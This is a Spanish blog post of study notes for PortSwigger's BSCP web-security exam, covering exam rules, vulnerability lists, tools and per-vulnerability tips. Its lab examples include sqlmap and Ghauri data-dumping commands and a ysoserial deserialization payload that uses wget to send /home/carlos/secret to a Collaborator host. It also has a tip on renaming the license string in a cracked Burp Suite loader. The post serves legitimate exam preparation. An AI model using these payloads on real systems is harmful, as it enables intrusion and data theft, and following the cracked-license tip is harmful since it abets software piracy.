---
title: Portswigger Exam Methodology
description: Metodología para el examen BSCP de Portswigger
date: 2026-09-02 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Exam
tags:
  - Portswigger Exam
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- BSCP

## Licencia de Burp Suite Professional

Para realizar el examen necesitamos una `licencia válida y activa de Burp Suite Professional`, tal como indica la FAQ oficial del BSCP [https://portswigger.net/web-security/certification/frequently-asked-questions](https://portswigger.net/web-security/certification/frequently-asked-questions). Podemos disponer de una `licencia de pago`. PortSwigger también ofrece una `licencia oficial de prueba`, que podemos solicitar siguiendo su documentación de instalación [https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install). Si vamos a utilizar una prueba para el examen, debemos comprobar su `vigencia y las condiciones aplicables`. La FAQ no detalla expresamente este caso

### Nota sobre versiones crackeadas

En el loader `BurpLoaderKeygen`, el nombre predeterminado de la licencia es `h3110w0r1d`, escrito exactamente así, según el código de KeygenForm.java [https://github.com/Pasanlaksitha/Decompiled-Burpsuit-Cracker/blob/main/com/burpsuitcrack/burploaderkeygen/KeygenForm.java](https://github.com/Pasanlaksitha/Decompiled-Burpsuit-Cracker/blob/main/com/burpsuitcrack/burploaderkeygen/KeygenForm.java)

La indicación de estos apuntes para quienes usen esa versión crackeada es `cambiar el nombre de la licencia de h3110w0r1d a trial user` en el loader. Este cambio de nombre `no convierte la copia en una licencia oficial de prueba ni acredita que sea válida para el examen`. El requisito oficial sigue siendo disponer de una `licencia válida y activa`

## Proceso de certificación

El examen sigue un proceso `similar` al de los `laboratorios de la Web Security Academy` y al del `examen de práctica`. Sin embargo, antes de poder realizarlo hay que pasar por un `proceso automatizado de verificación de identidad`

Para convertirse en `Burp Suite Certified Practitioner` hay que seguir estos pasos:

1 - `Comprar el examen de certificación`

2 - `Comprobar los requisitos del sistema`

3 - `Configurar el dispositivo` para que funcione con el `software de proctoring` y `subir los documentos de identidad`

4 - `Realizar el examen de certificación`

5 - `Obtener los resultados`

## ¿Cómo funciona el examen?

El `BSCP (Burp Suite Certified Practitioner)` es un `examen práctico` con una `duración` de `4 horas`. En él se nos proporcionan `2 aplicaciones web`, cada una con `vulnerabilidades deliberadas`, y debemos `comprometer ambas` para `aprobar`

Cada aplicación se completa en `3 etapas` que hay que resolver `en orden`:

1 - `Acceder a cualquier cuenta de usuario`

2 - `Usar esa cuenta para acceder al panel de administración` (normalmente en `/admin`), ya sea `escalando privilegios` o `comprometiendo la cuenta del administrador`

3 - `Usar el panel de administración para leer el contenido del archivo /home/carlos/secret` del sistema de archivos del servidor y `enviarlo mediante el botón "submit solution"`

Puntos clave para `aclarar dudas` que se nos pueden presentar:

- `Las etapas son secuenciales`: `no tiene sentido intentar comprometer el panel de administración si todavía no hemos accedido a una cuenta de usuario`

- Existe `siempre` una `cuenta de administrador` con el usuario `administrator` y una `cuenta de bajo privilegio` que `normalmente se llama carlos`

- Cada aplicación tiene `hasta un usuario activo simulado` (logueado como usuario o como administrador) que `visita la página principal del sitio cada 15 segundos`. Esto es `fundamental` para ataques como el `XSS`, donde debemos `robar su sesión`, ya que `no basta con encontrar la vulnerabilidad, hay que explotarla` (por ejemplo, en una `SQLI` hay que `extraer las credenciales` y usarlas para `acceder a una cuenta`)

- El `usuario víctima` utiliza `Chromium`, por lo que los `payloads de XSS` deben `funcionar en Chrome`

- Para `leer archivos` mediante un `SSRF`, hay que tener en cuenta que `el servicio interno se encuentra en localhost, en el puerto 6566` (`http://localhost:6566`)

- Los `ataques a la cabecera Host` están `permitidos`, pero las `cookies _lab y _lab_analytics forman parte de la funcionalidad esencial del examen`, así que `no debemos perder el tiempo manipulándolas`

- Mientras explotamos cada aplicación, obtendremos acceso a `funcionalidad potente`. Si la usamos para `eliminar nuestra propia cuenta` o un `componente esencial del sistema`, podemos `hacer que el examen sea imposible de completar`

- Aunque algunas `vulnerabilidades son difíciles de encontrar`, `no se ocultan de forma intencionada archivos ni páginas` que las contengan. `Nunca es necesario adivinar carpetas, nombres de archivo ni nombres de parámetros`

- Es recomendable `escanear páginas e insertion points seleccionados` con `Burp Suite Professional`, porque nos `ayuda a avanzar más rápido`, ya que un `escaneo completo de la aplicación` nos `haría perder demasiado tiempo`

- El examen tiene una `duración total de 4 horas`, por lo que hay que `gestionar bien el tiempo`

## Condiciones del examen

La `integridad` del examen es lo que lo hace tan `valioso`, por lo que existe un `sistema robusto` para `identificar y banear` a quienes `intenten hacer trampas`. Hay que tener en cuenta lo siguiente:

- Cualquier `trampa` conllevará un `baneo permanente`

- Hay que `usar un archivo de proyecto de Burp durante todo el examen` y `enviarlo para su análisis`

- Hay que `completar el examen sin ayuda de nadie`

- `No se deben compartir las direcciones del examen con nadie`

- Además, `pueden solicitarnos ese project file hasta una semana después de haber hecho el examen para confirmar el certificado` o `investigar cualquier incidencia reportada`

## Requisitos del sistema

### Sistema operativo

- `MacOS X 10.5 o superior`

- `Windows Vista o superior`

- `Linux`

- `ChromeOS`

### Navegador

- La `última versión` de `Google Chrome` (hay que `desactivar` el `bloqueador de pop-ups`)

### Hardware

- `Ordenador de escritorio o portátil`

- `Webcam integrada o externa`

- `Micrófono integrado o externo`

## Vulnerabilidades

### Oficiales

`Vulnerabilidades que aparecen en todas las guías acerca del examen`

| Vulnerability | Stage 1 | Stage 2 | Stage 3 |
| --- | :---: | :---: | :---: |
| SQLI |  | ✔️ | ✔️ |
| XSS | ✔️ | ✔️ |  |
| CSRF | ✔️ | ✔️ |  |
| Clickjacking | ✔️ | ✔️ |  |
| CORS | ✔️ | ✔️ |  |
| XXE |  |  | ✔️ |
| SSRF |  |  | ✔️ |
| HTTP Request Smuggling | ✔️ | ✔️ |  |
| Command Injection |  |  | ✔️ |
| SSTI |  |  | ✔️ |
| Path Traversal |  |  | ✔️ |
| Broken Access Control | ✔️ | ✔️ |  |
| Authentication Vulnerabilities | ✔️ | ✔️ |  |
| Web Cache Poisoning | ✔️ | ✔️ |  |
| Insecure Deserialization |  |  | ✔️ |
| HTTP Host Header Attacks | ✔️ | ✔️ |  |
| OAuth Vulnerabilities | ✔️ | ✔️ |  |
| File Upload Vulnerabilities |  |  | ✔️ |
| JWT Attacks | ✔️ | ✔️ |  |

### Adicionales

`Vulnerabilidades que puede ser que aparezcan en un futuro en el examen`

| Vulnerability | Stage 1 | Stage 2 | Stage 3 |
| --- | :---: | :---: | :---: |
| Information Disclosure | ✔️ | ✔️ |  |
| Business Logic Vulnerabilities | ✔️ | ✔️ |  |
| Api Testing | ✔️ | ✔️ |  |
| GraphQL Api Vulnerabilities | ✔️ | ✔️ |  |
| NoSQLI | ✔️ | ✔️ |  |
| Prototype Pollution |  | ✔️ | ✔️ |
| Race Conditions | ✔️ | ✔️ |  |
| Web Cache Deception | ✔️ | ✔️ |  |
| WebSocket Attacks | ✔️ | ✔️ |  |
| Web LLM Attacks | ✔️ | ✔️ | ✔️ |

### Vulnerabilidades por etapa en el examen

En esta `imagen` podemos `ver las vulnerabilidades que hay por fase en el examen`

![Vulnerabilidades por etapa del examen BSCP](/assets/img/Portswigger-Exam-Methodology/image_1.png)

## Recursos

### Guías de estudio

`Recursos necesarios para completar el examen`:

- botesjuan [https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git)

- DingyShark [https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git)

- Guía de ofuscación [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/)

- Hacking tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

- Hacking Notes Jordan [https://hacking-notes.jord4n.pro/web/bscp-certification-practical-guide](https://hacking-notes.jord4n.pro/web/bscp-certification-practical-guide)

### Experiencias con la certificación

- BSCP и с чем его едят? [https://habr.com/ru/articles/902466/](https://habr.com/ru/articles/902466/)

- BSCP в 2025 [https://habr.com/ru/articles/873672/](https://habr.com/ru/articles/873672/)

### Cheatsheets y diccionarios

- XSS Cheat Sheet de PortSwigger [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

- SQL Injection Cheat Sheet de PortSwigger [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

- Template Injection Table [https://cheatsheet.hackmanit.de/template-injection-table](https://cheatsheet.hackmanit.de/template-injection-table)

- Funciones PHP peligrosas [https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720)

- Diccionarios de loxs [https://github.com/coffinxp/loxs/tree/main/payloads](https://github.com/coffinxp/loxs/tree/main/payloads)

- Laboratorios de SQLI resueltos [https://justice-reaper.github.io/categories/sqli/](https://justice-reaper.github.io/categories/sqli/)

## Herramientas

Conviene `preparar y probar las herramientas antes del examen` y `habilitar las extensiones de Burp Suite necesarias en cada fase`. Esta selección complementa el post de Hacking Tools [https://justice-reaper.github.io/posts/Hacking-Tools/](https://justice-reaper.github.io/posts/Hacking-Tools/)

### Herramientas de escaneo e inyecciones

- Collaborator Everywhere [https://github.com/PortSwigger/collaborator-everywhere-v2.git](https://github.com/PortSwigger/collaborator-everywhere-v2.git)

- Backslash Powered Scanner [https://github.com/PortSwigger/backslash-powered-scanner.git](https://github.com/PortSwigger/backslash-powered-scanner.git)

- Error Message Checks [https://github.com/PortSwigger/error-message-checks.git](https://github.com/PortSwigger/error-message-checks.git)

- Active Scan ++ [https://github.com/PortSwigger/active-scan-plus-plus.git](https://github.com/PortSwigger/active-scan-plus-plus.git)

- Command Injection Attacker [https://github.com/PortSwigger/command-injection-attacker.git](https://github.com/PortSwigger/command-injection-attacker.git)

- Agartha [https://github.com/PortSwigger/agartha.git](https://github.com/PortSwigger/agartha.git)

### Herramientas de SQLI

- sqlmap [https://github.com/sqlmapproject/sqlmap.git](https://github.com/sqlmapproject/sqlmap.git)

- Ghauri [https://github.com/r0oth3x49/ghauri.git](https://github.com/r0oth3x49/ghauri.git)

### Herramientas de HTTP, cabeceras y caché

- HTTP Request Smuggler [https://github.com/PortSwigger/http-request-smuggler.git](https://github.com/PortSwigger/http-request-smuggler.git)

- Host Header Inchecktion [https://github.com/PortSwigger/host-header-inchecktion.git](https://github.com/PortSwigger/host-header-inchecktion.git)

- CORS* - Additional CORS Checks [https://github.com/PortSwigger/additional-cors-checks.git](https://github.com/PortSwigger/additional-cors-checks.git)

- Content Type Converter [https://github.com/PortSwigger/content-type-converter.git](https://github.com/PortSwigger/content-type-converter.git)

- Diff Hunter [https://github.com/Justice-Reaper/Diff-Hunter.git](https://github.com/Justice-Reaper/Diff-Hunter.git)

### Herramientas de JWT

- JWT Editor [https://github.com/PortSwigger/jwt-editor.git](https://github.com/PortSwigger/jwt-editor.git)

- JWT Scanner [https://github.com/PortSwigger/jwt-scanner.git](https://github.com/PortSwigger/jwt-scanner.git)

### Herramientas de deserialización insegura

- ysoserial [https://github.com/frohoff/ysoserial.git](https://github.com/frohoff/ysoserial.git)

- PHPGGC [https://github.com/ambionics/phpggc.git](https://github.com/ambionics/phpggc.git)

### Herramientas de subida de archivos

- Upload-Bypass de Justice-Reaper [https://github.com/Justice-Reaper/Upload-Bypass.git](https://github.com/Justice-Reaper/Upload-Bypass.git)

- Upload_Bypass de sAjibuu [https://github.com/sAjibuu/Upload_Bypass.git](https://github.com/sAjibuu/Upload_Bypass.git)

## Recomendaciones

### Preparación y repaso de laboratorios

Si nos vamos a presentar al `BSCP`, tenemos que `conocer bien la estructura` de los repositorios de botesjuan [https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study.git) y DingyShark [https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner.git)

Tenemos que `completar todos los laboratorios dos veces`, porque `pueden aparecer en el examen las mismas vulnerabilidades` o `pequeñas variaciones`:

- `Primera vuelta`: hacer todos los laboratorios para `entender las vulnerabilidades y cómo se explotan`

- `Segunda vuelta`: `volver a hacer todos los laboratorios antes del examen` para repasar y afianzar lo aprendido

Para orientarnos sobre las vulnerabilidades de cada fase, podemos consultar las tablas y la imagen de la sección `Vulnerabilidades`. Son una `referencia de los apuntes`, no una distribución que debamos dar por segura en cada aplicación

`Es recomendable tener los laboratorios hechos y subidos a una web o un blog para poder repasarlos`. También podemos consultar los laboratorios resueltos y explicados en inglés por siunam321 [https://siunam321.github.io/](https://siunam321.github.io/) y en español por Justice-Reaper [https://justice-reaper.github.io](https://justice-reaper.github.io)

### Búsqueda de información y apoyo de IA

`Hay escenarios que no están contemplados en ninguno de los dos repositorios`. En ese caso, podemos buscar en Google utilizando `bscp exam` seguido de la `ruta o funcionalidad` que estamos investigando. Por ejemplo:

```text
bscp exam admin-panel/metrics/img%3Fimgname=1&dimensions="200x133!"
```

Si usamos el `modo IA`, conviene `consultar las fuentes de la respuesta` y pedir que `amplíe la búsqueda e indique de dónde obtiene la información`

Durante la `preparación con laboratorios`, podemos usar `Claude de pago u otra IA` para ayudarnos a `adaptar payloads a los WAF` y a `buscar información en los repositorios`. Para ello, conviene `clonar los repositorios de botesjuan y DingyShark` y aportar las `peticiones HTTP` para localizar `payloads y vulnerabilidades que puedan encajar`. Hay que `comprobar las propuestas y adaptarlas al comportamiento de la aplicación`

### Variaciones de los laboratorios

`Nos puede tocar una combinación de vulnerabilidades`. Por ejemplo, `en los laboratorios hay un documento XML con el que podemos explotar una SQLI` y en el `examen` a lo mejor `no es una SQLI`, sino un `command injection`. Tenemos que analizar el comportamiento de la aplicación y adaptar las pruebas

### WAF y codificación de payloads

Antes de `utilizar` la `IA` para `encodear caracteres`, vamos a probar estas cosas:

- `URL-encodeamos` los `caracteres especiales` como `.` y `/` dos veces, primero el `.` o `/` y luego el `%`. Si no funciona, `probamos a URL-encodear solamente una vez`

- En un `XML`, por ejemplo, el `&` tenemos que `XML-encodearlo`

- En un `LFI` puede que tengamos que `URL-encodear` una `palabra` o `parte de ella`

- En un `File Upload` puede que tengamos que poner `%00.png` para que ignore la `extensión`

Para más `técnicas de ofuscación` con las que `evadir el WAF`, podemos `consultar la guía de ofuscación` [https://justice-reaper.github.io/posts/Ofuscation-Guide/](https://justice-reaper.github.io/posts/Ofuscation-Guide/) o simplemente hacer que la `IA` la `lea` y `nos genere los encodings correctos`

### Entorno de trabajo

Tenemos que `evitar` que el `tráfico de snoopervisor.net` pase por `Burp Suite`, porque si no `nos petará Burp Suite en segundos`. `Una forma fácil de hacerlo es usar Chromium para el proceso de verificación de identidad y Google Chrome para completar el examen`

## Notas prácticas por vulnerabilidad

### XSS

Conviene `crear un diccionario propio con los payloads utilizados en los laboratorios` y usar los payloads de loxs [https://github.com/coffinxp/loxs/tree/main/payloads](https://github.com/coffinxp/loxs/tree/main/payloads) como referencia para las `pruebas manuales`. Tenemos que `adaptar cada payload al contexto de inyección`

También conviene preparar, en los laboratorios, `varias variantes de payloads de exfiltración de cookies de sesión`, ya que un `WAF puede bloquear determinados caracteres`. Así podemos escoger una base que encaje con el contexto y adaptar su codificación

Podemos `guardar esas variantes en una lista` y usar `Claude u otra IA durante la preparación` para ayudarnos a adaptarlas a los caracteres permitidos, comprobando después su funcionamiento en el laboratorio

La XSS Cheat Sheet de PortSwigger [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) nos sirve para seleccionar las `etiquetas y los atributos` que queremos probar. Podemos usar estas plantillas y `sustituir FUZZ por cada candidato`

Para probar `etiquetas`, sustituimos las dos apariciones de `FUZZ` por la misma etiqueta:

```html
<FUZZ>testing</FUZZ>
```

Para probar `atributos`, usamos como base una etiqueta aceptada por el filtro y sustituimos `FUZZ` por el atributo:

```html
<test FUZZ=test></test>
```

### SQLI

Podemos probar `sqlmap` y `Ghauri`. Los siguientes comandos proceden de un escenario de laboratorio con `PostgreSQL`. Tenemos que `sustituir LAB-ID y SESSION_COOKIE` por los valores del laboratorio y `adaptar los parámetros y el motor` al caso que estemos analizando. El `asterisco` marca el punto de inyección que queremos probar

Prueba con `sqlmap` sobre el parámetro `order`:

```bash
sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=test&organize=5&order=ASC*&BlogArtist=' \
    --cookie='session=SESSION_COOKIE' \
    --risk=3 --level=5 --random-agent --batch --dbms=PostgreSQL
```

Prueba con `Ghauri` para obtener la base de datos actual:

```bash
ghauri -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=test*&organize=5*&order=ASC*&BlogArtist=*' \
    --cookie='session=SESSION_COOKIE' \
    --level=3 --random-agent --batch --current-db --dbms=PostgreSQL
```

En el ejemplo de los apuntes se utilizó `public` y la tabla `users` como objetivo de extracción. `No debemos asumir que esos nombres serán iguales en todas las aplicaciones`. Primero comprobamos la estructura y después limitamos la extracción a los datos que necesitemos

```bash
sqlmap -u 'https://LAB-ID.web-security-academy.net/filtered_search?find=test&organize=5&order=ASC*&BlogArtist=' \
    --cookie='session=SESSION_COOKIE' \
    --risk=3 --level=5 --random-agent --batch --dbms=PostgreSQL \
    -D public -T users --columns --dump
```

Si las herramientas no funcionan, podemos pasar a `pruebas manuales` con la SQL Injection Cheat Sheet de PortSwigger [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) y adaptar los scripts de Python de los laboratorios de SQLI [https://justice-reaper.github.io/categories/sqli/](https://justice-reaper.github.io/categories/sqli/). Durante la preparación, también podemos pedir ayuda a la IA para `adaptar la sintaxis del payload al motor y al contexto de la inyección`

### Deserialización insegura

Para `Java`, podemos preparar payloads con `ysoserial`. Para `PHP`, tenemos `PHPGGC`. La cadena de gadgets y el formato del payload deben `coincidir con las librerías y el procesamiento de la aplicación`

Este ejemplo de laboratorio usa `Java 8` y `CommonsCollections2`, comprime el resultado con `gzip`, lo codifica en `Base64` y finalmente aplica `URL encoding`. Tenemos que `adaptar la ruta de Java y de ysoserial-all.jar` y sustituir `COLLABORATOR-ID` por nuestro identificador de Collaborator

```bash
/usr/lib/jvm/java-8-openjdk/bin/java -jar ysoserial-all.jar CommonsCollections2 \
    '/usr/bin/wget --post-file /home/carlos/secret https://COLLABORATOR-ID.oastify.com/' \
    | gzip \
    | base64 -w0 \
    | python3 -c 'import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))'
```

El comando generado intenta `enviar el contenido de /home/carlos/secret a Collaborator`. Esta secuencia de compresión y codificación solo encaja si la aplicación `espera y procesa ese formato`

### Web Cache Poisoning

Si nos atascamos en las pruebas de `Web Cache Poisoning`, podemos usar Diff Hunter [https://github.com/Justice-Reaper/Diff-Hunter.git](https://github.com/Justice-Reaper/Diff-Hunter.git) para `comparar peticiones y respuestas` e investigar diferencias que hayan pasado desapercibidas al trabajar con `Param Miner`

### File Upload

Para probar restricciones de subida, podemos usar Upload_Bypass de sAjibuu [https://github.com/sAjibuu/Upload_Bypass.git](https://github.com/sAjibuu/Upload_Bypass.git). Si necesitamos `variaciones de nombres de archivo y diccionarios de bypass`, podemos prepararlos con Upload-Bypass de Justice-Reaper [https://github.com/Justice-Reaper/Upload-Bypass.git](https://github.com/Justice-Reaper/Upload-Bypass.git)

Tenemos que `adaptar cada prueba a la restricción observada` y comprobar cómo procesa el servidor el `nombre, la extensión, el Content-Type y el contenido del archivo`

### LFI y Path Traversal

Para pruebas como `LFI`, podemos consultar los diccionarios de loxs [https://github.com/coffinxp/loxs/tree/main/payloads](https://github.com/coffinxp/loxs/tree/main/payloads), pero conviene `evitar lanzar payloads de forma indiscriminada`. Primero usamos el `escáner de Burp Suite sobre puntos seleccionados` y después probamos las `variaciones y codificaciones` que encajen con el filtro observado

Si el WAF bloquea una palabra o un carácter, podemos probar `URL encoding o doble URL encoding`, aplicándolo únicamente a la parte del payload que dé problemas

### HTTP Request Smuggling

Es recomendable `preparar las peticiones de los laboratorios y sus variaciones`. Por ejemplo, en un escenario con `XSS en el User-Agent`, podemos encontrarnos con `HTTP Request Smuggling TE.CL` en lugar del `CL.TE` utilizado en el laboratorio. Podemos apoyar las pruebas con `HTTP Request Smuggler`

### SSTI

Para las pruebas de `SSTI`, podemos consultar la Template Injection Table [https://cheatsheet.hackmanit.de/template-injection-table](https://cheatsheet.hackmanit.de/template-injection-table)

### Revisión de código PHP

Si tenemos código `PHP` disponible, la lista de funciones PHP peligrosas [https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720) nos sirve como apoyo para revisar operaciones relevantes

## Resolución de problemas

Si damos con una `solución que no funciona como esperábamos`, podemos seguir estos consejos generales:

- Si estamos `atacando al usuario víctima`, `probamos el ataque primero en nuestro propio navegador`. Prestamos `mucha atención a la secuencia de tráfico HTTP en Burp`

- Si nuestra `solución está adaptada de un laboratorio de la Academy`, intentamos `analizar en qué se diferencia la aplicación respecto al laboratorio`

- Intentamos `identificar las suposiciones que estamos haciendo` y `ponerlas a prueba`

- Volvemos a `consultar el conjunto de habilidades que la certificación pretende demostrar`

## Resultados

Si `no hemos recibido los resultados tras 3-5 días laborables`, podemos `iniciar sesión en nuestra cuenta de PortSwigger` para `comprobar el estado del examen`. Nos `notificarán los resultados por correo electrónico`:

- Si `aprobamos` el examen, recibiremos un `enlace a nuestro certificado por correo electrónico`

- Si `suspendemos`, nos lo `comunicarán por correo electrónico` y nos `proporcionarán recursos y orientación` para ayudarnos a `preparar el reintento` de la certificación
